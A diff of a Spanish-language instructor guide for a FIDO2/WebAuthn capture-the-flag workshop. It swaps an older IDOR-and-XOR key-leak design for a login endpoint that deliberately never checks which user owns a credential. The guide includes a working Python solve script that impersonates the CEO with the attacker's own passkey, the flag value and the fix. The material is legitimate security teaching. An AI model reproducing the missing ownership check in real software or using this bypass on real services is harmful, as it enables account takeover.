@@ -15,127 +15,134 @@ Enseñar, **por contraste**, cómo funciona FIDO2/WebAuthn real mostrando una
 implementación TRUCHA que hace todo mal. El estudiante ataca la versión mala y,
 al resolverla, entiende exactamente qué garantías le da la versión buena.
 
-El aprendizaje central: **el pecado capital de la autenticación es tener una
-clave privada accesible del lado del cliente o del servidor.** FIDO2/passwordless
-real es seguro justamente porque la clave privada vive en hardware inextraíble
-y solo viajan la clave pública y las firmas.
+El aprendizaje central: un servidor de autenticación no solo debe verificar que
+una firma sea **válida**, sino **a quién pertenece la credencial que firma**.
+FIDO2/WebAuthn real ata cada credencial a su dueño y comprueba ese *binding* en
+cada login (`allowCredentials`); sin ese chequeo, cualquier passkey válida sirve
+para entrar como cualquiera. Como bonus, el diseño refuerza que el servidor
+—igual que FIDO2 real— **nunca guarda claves privadas**: no hay nada que robar.
 
-## 2. Diseño de la app y vulnerabilidades intencionales
+## 2. Diseño de la app y la vulnerabilidad intencional
 
-La app imita superficialmente a WebAuthn con estos endpoints:
+Como FIDO2 real, el servidor solo guarda claves **públicas** (tabla
+`credentials`); la privada de cada passkey vive del lado del cliente. Endpoints:
 
-| Endpoint | Qué hace | Vulnerabilidad |
-|---|---|---|
-| `POST /auth/challenge` | `{username}` → `{challenge, user_id}` | Filtra el `user_id` (pista del IDOR). |
-| `GET /auth/keys/<user_id>` | Devuelve la clave privada **codificada** del usuario | **IDOR** (sin autorización) + clave privada recuperable del server. |
-| `POST /auth/verify` | `{username, challenge, signature}` → sesión | El único factor es la firma; quien tenga la privada entra. |
-| `GET /profile` | Muestra el `user_id` propio | Pista alternativa del IDOR. |
+| Endpoint | Qué hace |
+|---|---|
+| `POST /auth/register` | `{username, credential_id, public_key}` → registra una passkey (solo la pública). Bloqueado si la cuenta tiene el registro cerrado (el CEO). |
+| `POST /auth/challenge` | `{username}` → `{challenge, allow_credentials}`. `allow_credentials` son los `credential_id` de ESE usuario (lo que un cliente honesto usaría). |
+| `POST /auth/verify` | `{username, credential_id, challenge, signature}` → verifica la firma y **abre sesión como `username`**. |
 
-Buscar el string `VULN` en `app.py` y `crypto_utils.py` para ver cada punto
-comentado. Las tres vulnerabilidades:
+Buscar el string `VULN` en `app.py`. Hay **una** vulnerabilidad central:
 
-- **VULN-1 (IDOR):** `/auth/keys/<user_id>` no valida que quien pide sea el
-  dueño (ni siquiera exige sesión).
-- **VULN-2 (codificación ≠ cifrado):** la clave privada existe del lado del
-  servidor apenas "codificada" con `base64(XOR(base64(PEM), key))`, y la `key`
-  está a la vista en `static/js/script.js`.
-- **VULN-3 (diseño):** un único factor cuya clave privada es alcanzable por la
-  red ⇒ suplantable remotamente.
+- **VULN (binding credencial→usuario):** en `/auth/verify` el server valida que
+  la firma sea correcta para la clave pública de la credencial presentada, pero
+  **no** valida que esa credencial pertenezca al `username` reclamado. Falta, a
+  propósito, el chequeo `credential["user_id"] == user["id"]` (y/o que el
+  `credential_id` esté en `allow_credentials` del usuario).
+
+Detalle de diseño que evita el atajo trivial: el CEO tiene
+`passkey_registration_open=0` (su passkey se aprovisiona en el `seed`), así
+**nadie puede registrar una passkey nueva directamente para el CEO**. El atacante
+se ve forzado a usar la confusión de credencial.
 
 ## 3. Solución paso a paso
 
-Los `user_id` están en el rango `70xx`, no en `1/2`, para forzar la
-enumeración. En esta instancia: `alumno=7042`, `ceo=7013`, señuelos `7025 /
-7031 / 7058`.
+Usuarios: `alumno` (registro abierto), `ceo` (objetivo, registro cerrado),
+señuelos `lmoreno / dferreyra / sibarra`.
 
 ### Capa 1 — Reconocimiento del flujo (Burp)
 
 Con Burp interceptando, ir a `http://localhost:5000/login`, escribir `alumno` y
 tocar el botón de huella. En el proxy aparecen, en orden:
 
-1. `POST /auth/challenge` con `{"username":"alumno"}` → responde
-   `{"ok":true,"username":"alumno","user_id":7042,"challenge":"..."}`.
-   **Acá ya se filtra el `user_id` propio (7042).**
-2. `GET /auth/keys/7042` → responde la clave privada **codificada** del alumno.
-   **El navegador está bajando una clave privada por la red.**
-3. `POST /auth/verify` con `{"username","challenge","signature"}` → sesión y
-   redirección al dashboard.
+1. `POST /auth/register` con `{"username":"alumno","credential_id":"...","public_key":"-----BEGIN PUBLIC KEY-----..."}`
+   → el navegador generó su passkey y registró **solo la clave pública**.
+2. `POST /auth/challenge` con `{"username":"alumno"}` → `{"challenge":"...","allow_credentials":["..."]}`.
+3. `POST /auth/verify` con `{"username","credential_id","challenge","signature"}` → sesión.
 
-**Aprendizaje:** reconocer la estructura passwordless (challenge → firma →
-verify) y notar la anomalía grave: la clave privada viaja al cliente.
+**Aprendizaje:** el flujo es register → challenge → firma → verify, y la clave
+privada **nunca** aparece en ninguna request (bien, como FIDO2 real). El fallo no
+está a la vista: hay que razonar sobre qué chequea (y qué no) el `verify`.
 
-### Capa 2 — Obtener la clave privada del CEO (Burp + DevTools)
+### Capa 2 — Descubrir la falta de binding
 
-1. **IDOR:** repetir el `GET /auth/keys/7042` en el Repeater de Burp cambiando
-   el id. Como la respuesta incluye `username` y `display_name`, enumerando el
-   rango `70xx` se identifica al CEO:
+Probar, en el Repeater de Burp, a mezclar identidades en `/auth/verify`:
 
-   ```
-   GET /auth/keys/7013  →  {"username":"ceo","display_name":"Ricardo Vega — CEO ...", "private_key":"..."}
-   ```
+- Registrar una passkey propia en `alumno` (Capa 1) deja un `credential_id`
+  nuestro con su clave.
+- Intentar registrar una passkey directamente para `ceo` → `403 El registro de
+  passkeys está deshabilitado para esta cuenta`. Ese callejón sin salida es la
+  pista: al CEO no se le puede registrar una passkey, pero **quizás su `verify`
+  acepte la nuestra**.
+- Pedir un challenge de `ceo`, firmarlo con **nuestra** clave y mandarlo a
+  `/auth/verify` con `username: ceo` pero **nuestro** `credential_id`.
 
-2. **Decodificar:** abrir DevTools → `static/js/script.js`. Ahí está, a la
-   vista:
-   - La constante `BACKUP_KEY = "hb_backup_key_2026"`.
-   - La función `decodePrivateKey()`: revierte
-     `base64( XOR( base64(PEM), BACKUP_KEY ) )`.
+**Aprendizaje:** el server verifica la firma contra la credencial que le pasás,
+sin comprobar que sea del `ceo`. En FIDO2 real, `verify` solo acepta credenciales
+que estén en `allowCredentials` del usuario.
 
-   Replicando esa lógica se obtiene el PEM de la clave privada del CEO en claro.
+### Capa 3 — Suplantar al CEO (Python)
 
-**Aprendizaje:** la clave privada jamás debería ser accesible por la red ni
-guardada de forma recuperable en el server. **Codificar no es cifrar.** En FIDO2
-real no hay ninguna clave privada del lado del server: solo se guardan públicas.
-
-### Capa 3 — Autenticarse como el CEO (Python)
-
-1. Pedir un challenge fresco: `POST /auth/challenge` con `{"username":"ceo"}`.
-2. Firmar ese challenge con ECDSA-SHA256 usando la clave robada.
-3. Enviar `POST /auth/verify` con `{username, challenge, signature}`.
-4. El servidor valida la firma con la clave pública del CEO → login → el
-   dashboard muestra el **código ganador**.
+1. Generar un par propio (la privada nunca sale de tu máquina).
+2. Registrar la pública en `alumno`: `POST /auth/register`.
+3. Pedir un challenge fresco del `ceo` y firmarlo con tu clave (ECDSA-SHA256,
+   raw `r||s` de 64 bytes).
+4. `POST /auth/verify` con `{username: "ceo", credential_id: <el tuyo>, challenge, signature}`
+   → login como CEO → el dashboard muestra el **código ganador**.
 
 **Detalles que lo hacen no-trivial:**
-- El `challenge` debe ser el **vigente** para ese usuario (un solo uso, con
-  TTL): hay que pedir uno fresco y firmarlo, no sirve reusar uno viejo.
-- El formato de firma en el "cable" es **raw `r||s` de 64 bytes** (el que
-  produce WebCrypto), no DER. `cryptography` firma en DER por defecto, así que
-  hay que convertir DER → raw. El servidor hace la conversión inversa para
-  verificar.
+- El `challenge` es de un solo uso y con TTL: pedir uno fresco y firmarlo enseguida.
+- La firma en el "cable" es **raw `r||s` (64 bytes)**, no DER; `cryptography`
+  firma en DER, hay que convertir DER → raw.
 
 ### Script de resolución
 
-El repo incluye [`solve.py`](solve.py), que encadena todo. Su núcleo:
+El repo incluye [`solve.py`](solve.py), que ejecuta el ataque. Su núcleo:
 
 ```python
-import base64, requests
+import requests
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import ec
 from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature
 
 BASE = "http://localhost:5000"
-BACKUP_KEY = b"hb_backup_key_2026"   # tomada del JS del frontend
-
-def xor(data, key):
-    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
-
-def decode(obf):                      # revierte base64(XOR(base64(PEM), key))
-    return base64.b64decode(xor(base64.b64decode(obf), BACKUP_KEY)).decode()
-
 s = requests.Session()
-ch = s.post(f"{BASE}/auth/challenge", json={"username": "ceo"}).json()   # (1) challenge + user_id
-keys = s.get(f"{BASE}/auth/keys/{ch['user_id']}").json()                 # (2) IDOR: clave del CEO
-priv = serialization.load_pem_private_key(decode(keys["private_key"]).encode(), None)
 
-der = priv.sign(ch["challenge"].encode(), ec.ECDSA(hashes.SHA256()))     # (3) firmar
-r, sig_s = decode_dss_signature(der)
-raw = (r.to_bytes(32, "big") + sig_s.to_bytes(32, "big")).hex()          #     DER -> raw r||s
+# (1) mi propio par; la privada nunca sale de acá
+priv = ec.generate_private_key(ec.SECP256R1())
+pub_pem = priv.public_key().public_bytes(
+    serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo).decode()
+cred_id = "attacker-" + priv.private_numbers().private_value.to_bytes(32, "big").hex()[:24]
 
+# (2) registro MI passkey en una cuenta con registro abierto
+s.post(f"{BASE}/auth/register", json={"username": "alumno", "credential_id": cred_id, "public_key": pub_pem})
+
+# (3) challenge del CEO, firmado con MI clave (DER -> raw r||s)
+ch = s.post(f"{BASE}/auth/challenge", json={"username": "ceo"}).json()["challenge"]
+der = priv.sign(ch.encode(), ec.ECDSA(hashes.SHA256()))
+r, ss = decode_dss_signature(der)
+sig = (r.to_bytes(32, "big") + ss.to_bytes(32, "big")).hex()
+
+# (4) verify diciendo que soy el CEO, pero con MI credential_id -> entra
 out = s.post(f"{BASE}/auth/verify",
-             json={"username": "ceo", "challenge": ch["challenge"], "signature": raw}).json()
-print(out)                                                              # (4) login OK -> leer /dashboard
+             json={"username": "ceo", "credential_id": cred_id, "challenge": ch, "signature": sig}).json()
+print(out)  # login OK -> leer /dashboard para la flag
 ```
 
 Salida esperada: login exitoso y, al leer `/dashboard`, el código ganador.
+
+### La corrección (para el debate de mitigación)
+
+En `/auth/verify`, después de verificar la firma, agregar el binding:
+
+```python
+if credential["user_id"] != user["id"]:
+    return jsonify(ok=False, error="Credencial no registrada para este usuario."), 401
+```
+
+(equivalente a exigir que el `credential_id` esté en `allow_credentials` del
+usuario, que es lo que hace WebAuthn real).
 
 ## 4. El código ganador (flag)
 
@@ -192,13 +199,13 @@ la base de datos del servidor, no puede obtener la clave privada.
 
 ### Tabla comparativa (la que ve el estudiante al ganar)
 
-| Lo que rompiste (FIDO2 trucho) | Cómo lo previene FIDO2 real |
+| Lo que rompiste (FIDO2 de cartón) | Cómo lo previene FIDO2 real |
 |---|---|
-| Descargaste la clave privada del CEO por la red | La clave nunca sale del TPM — es físicamente inextraíble |
-| La clave estaba codificada, no cifrada de verdad | El servidor solo guarda claves PÚBLICAS, no hay secreto que robar |
-| Firmaste el challenge como si fueras el CEO | La firma real exige presencia física + verificación biométrica en hardware |
-| El endpoint no validó autorización (IDOR) | La clave no existe fuera del dispositivo, no hay endpoint que exponer |
-| Todo el flujo es suplantable remotamente | FIDO2 ata cada firma al `origin` (dominio) → resistente a phishing |
+| Entraste como el CEO usando TU propia passkey | FIDO2 solo acepta las credenciales registradas de ESE usuario (`allowCredentials`) |
+| El servidor verificó la firma pero no de quién era la credencial | Cada credencial está ligada a su dueño y el server lo comprueba en cada login |
+| Te hiciste pasar por el CEO sin tener su clave | La firma exige presencia física + verificación biométrica en el hardware del dueño |
+| Nunca hizo falta robar ninguna clave privada | El servidor solo guarda claves PÚBLICAS: no hay secreto que robar |
+| Todo el ataque se hizo de forma remota | FIDO2 ata cada firma al `origin` (dominio) → resistente a phishing |
 
 ## 6. Rúbrica de evaluación sugerida
 
@@ -206,11 +213,10 @@ El informe del estudiante debería incluir:
 
 | Criterio | Qué se espera | Puntaje |
 |---|---|---|
-| Reconocimiento (Capa 1) | Capturas de Burp del flujo `challenge → keys → verify` y descripción de la anomalía (la privada viaja al cliente). | 15% |
-| IDOR (Capa 2) | Explicación del `GET /auth/keys/<id>`, evidencia de la enumeración y de cómo identificó al CEO. | 25% |
-| Decodificación (Capa 2) | Descripción del esquema `base64(XOR(base64(PEM),key))`, dónde encontró la key y cómo lo revirtió. | 20% |
-| Firma y suplantación (Capa 3) | Script/pasos para firmar el challenge (formato raw r||s, curva P-256) y obtener la flag. | 25% |
-| Mitigación | Propuesta concreta: por qué FIDO2 real lo previene (clave en TPM, solo públicas en el server, binding al origin). | 15% |
+| Reconocimiento (Capa 1) | Capturas de Burp del flujo `register → challenge → verify` y descripción (la privada nunca viaja; el server solo guarda públicas). | 15% |
+| Descubrir el fallo (Capa 2) | Evidencia de que `/auth/verify` acepta una credencial que no pertenece al usuario (falta de binding); el `403` del registro del CEO como pista. | 30% |
+| Suplantación (Capa 3) | Script/pasos: registrar passkey propia, firmar el challenge del CEO (raw r||s, P-256) con `credential_id` propio, obtener la flag. | 30% |
+| Mitigación | Propuesta concreta: verificar el binding credencial→usuario (`allowCredentials`) en `verify`. | 25% |
 
 Flag correcta (`f27ad11c21afef4f4c54a3930698f616`) como condición necesaria.
 
@@ -218,27 +224,30 @@ Flag correcta (`f27ad11c21afef4f4c54a3930698f616`) como condición necesaria.
 
 ### Tiempo estimado de resolución
 - Reconocimiento (Capa 1): 15-25 min.
-- IDOR + decodificación (Capa 2): 25-40 min.
-- Firma y suplantación (Capa 3): 25-40 min.
-- **Total estimado: 65-105 minutos** según nivel del participante.
+- Descubrir la falta de binding (Capa 2): 25-45 min.
+- Suplantación con Python (Capa 3): 25-40 min.
+- **Total estimado: 65-110 minutos** según nivel del participante.
 
 ### Cómo resetear el entorno entre participantes
 - Con Docker: `docker compose restart` (o `down` + `up`). `seed.py` recrea la
-  base con claves nuevas en cada arranque.
+  base en cada arranque (resiembra usuarios y reaprovisiona la passkey del CEO).
 - Local: volver a correr `python seed.py`.
 - No hace falta borrar nada a mano: no hay estado persistente entre corridas.
+  (Las passkeys que el navegador guarda en `localStorage` son por dispositivo;
+  para empezar de cero en el mismo navegador, limpiar el `localStorage` del sitio.)
 
 ### Problemas comunes
 
 | Problema | Causa probable | Solución |
 |---|---|---|
 | El botón de huella no hace nada | El navegador no ejecutó `script.js` o hubo un error JS | Abrir la consola de DevTools; verificar que el usuario exista. |
+| `403` al loguearse como `ceo` en la web | El CEO tiene el registro de passkeys cerrado (es a propósito) | No es un bug: hay que resolverlo con la confusión de credencial, no registrando una passkey para el CEO. |
 | "Firma inválida" al resolver en Python | Se envió la firma en DER en vez de raw r||s | Convertir DER → r‖s (64 bytes) como en `solve.py`. |
 | "Challenge inválido, vencido o ya usado" | Se reusó un challenge viejo o expiró (TTL 5 min) | Pedir un challenge nuevo justo antes de firmar. |
 | El puerto 5000 está ocupado | Otra instancia corriendo | `docker compose down` de la anterior, o cambiar el mapeo de puerto. |
 
 ### Recordatorio ético para la apertura del taller
-Dejar explícito que las técnicas (IDOR, análisis de JS, forja de firmas) se
-practican acá sobre un blanco ficticio y con permiso, y que aplicarlas contra
-sistemas reales sin autorización es ilegal. El valor está en entender la
-defensa: por qué FIDO2 real hace imposible este ataque.
+Dejar explícito que las técnicas (análisis de una API de autenticación, forja de
+firmas, abuso de autorización) se practican acá sobre un blanco ficticio y con
+permiso, y que aplicarlas contra sistemas reales sin autorización es ilegal. El
+valor está en entender la defensa: por qué FIDO2 real hace imposible este ataque.
